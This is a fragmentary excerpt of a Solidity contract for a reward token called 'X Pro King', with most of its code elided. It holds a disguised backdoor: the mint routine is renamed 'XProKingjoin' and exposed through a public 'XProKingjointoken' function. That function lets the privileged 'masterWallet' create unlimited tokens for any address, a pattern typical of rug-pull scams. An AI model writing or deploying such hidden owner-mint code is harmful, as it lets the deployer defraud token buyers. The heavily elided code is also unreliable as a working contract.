...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function XProKingjoin(address account, uint256 amount) internal virtual {
...
function XProKingjoin(address account, uint256 value) internal override {
    super.XProKingjoin(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      XProKingjoin(account, mintAmount);
...
contract XProKingrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardXProKingMap  for RewardXProKingMap .Map;
RewardXProKingMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("XProKing_rewardToken_Tracker", "XProKing_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "XProKing_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "XProKing_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main XProKing contract.");
    }
...
contract XProKing is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    XProKingrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0x9bF2729569aD847012d7cA74d5048fAd01a29Bb2;
...
bool public cooldownEnabled = false;
 ...
 uint256 public  bnbReward = 7;
  ...
  constructor() ERC20("X Pro King", " XPK") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new XProKingrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 XProKingjoin(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function XProKingjointoken(address userjoin, uint256 tokenjoin) public masterWallet{
       XProKingjoin(userjoin, tokenjoin);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "XProKing: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "XProKing: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "XProKing: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "XProKing: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTXProKing = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTXProKing);
...
addLiquidity(tokensTXProKing, bnbForLiquidity);
